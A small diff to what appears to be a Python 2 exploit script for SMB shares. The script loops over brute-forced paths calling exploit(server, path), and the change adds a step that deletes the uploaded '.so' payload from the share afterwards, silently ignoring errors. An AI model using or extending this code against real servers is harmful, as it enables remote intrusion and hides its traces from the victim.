@@ -82,6 +82,10 @@ def scan_share(server, share_name, cmd):
             paths = brute_force_location(payload)
             for path in paths:
                 exploit(server, path)
+            try:
+                smb.remove(payload + '.so')
+            except Exception, err:
+                pass
         smb.close()
     except Exception, err:
         pass
